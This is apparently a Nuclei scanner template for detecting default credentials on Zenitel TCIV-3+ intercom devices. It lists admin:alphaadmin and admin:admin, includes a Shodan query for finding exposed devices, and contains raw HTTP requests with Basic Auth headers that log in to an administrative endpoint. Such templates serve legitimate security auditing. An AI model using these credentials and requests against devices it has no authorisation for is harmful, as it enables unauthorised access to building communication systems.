id: zenitel-default-credentials

info:
  name: Zenitel Default Credentials
  author: Ashish Kunwar (D0rkerDevil)
  severity: high
  description: |
    Zenitel TCIV-3+ devices may have default credentials enabled.
    Common default credentials: admin:alphaadmin
  reference:
    - https://wiki.zenitel.com/wiki/TCIV-3+
  classification:
    cwe-id: CWE-521
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  metadata:
    shodan-query: 'http.html:"Zenitel" OR http.html:"Station Web"'
  tags: zenitel,default-credentials,iot,intercom

http:
  # Test admin:alphaadmin with Basic Auth
  - raw:
      - |
        GET /goform/zForm_stn_info HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic YWRtaW46YWxwaGFhZG1pbg==
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

    matchers:
      - type: status
        status:
          - 200
      
      - type: word
        words:
          - "zenitel.js"
        part: body

    matchers-condition: and

  # Test admin:admin with Basic Auth
  - raw:
      - |
        GET /goform/zForm_stn_info HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic YWRtaW46YWRtaW4=
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

    matchers:
      - type: status
        status:
          - 200
      
      - type: word
        words:
          - "zenitel.js"
        part: body

    matchers-condition: and

